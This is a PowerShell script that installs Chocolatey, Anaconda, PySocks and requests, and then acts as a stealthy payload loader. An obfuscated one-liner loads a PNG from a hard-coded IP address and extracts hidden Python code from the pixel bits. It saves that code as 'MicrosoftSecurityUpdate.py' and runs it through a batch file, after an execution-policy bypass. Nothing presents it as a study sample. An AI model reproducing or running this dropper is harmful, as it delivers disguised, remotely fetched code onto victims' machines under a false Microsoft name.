$InstallDir='C:\Users\Public\Chocolatey'
$env:ChocolateyInstall="$InstallDir"

Set-ExecutionPolicy Bypass -Scope Process -Force;

iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco upgrade chocolatey --force -y

choco install anaconda3 --force -y --params '"/JustMe /AddToPath /D:C:\Users\Public\Chocolatey\tools"'

Import-Module "$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"

refreshenv

conda update -n base -c defaults conda -y

conda install -c anaconda pip -y

pip install --no-input PySocks

pip install --no-input requests


Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://192.168.10.128/7.png");$gg=$dd.Image;$oo=abc Byte[] 3840;(0..0)|%{foreach($x in(0..3839)){$p=$gg.GetPixel($x,$_);$oo[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};$egh=[System.Text.Encoding]::UTF8.GetString($oo[0..2197]);Out-File -FilePath "$InstallDir\MicrosoftSecurityUpdate.py" -InputObject $egh -Force -Encoding utf8

$batch_script = 'python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py' | out-file -filepath "$InstallDir\MicrosoftSecurityUpdate.bat"

C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.bat
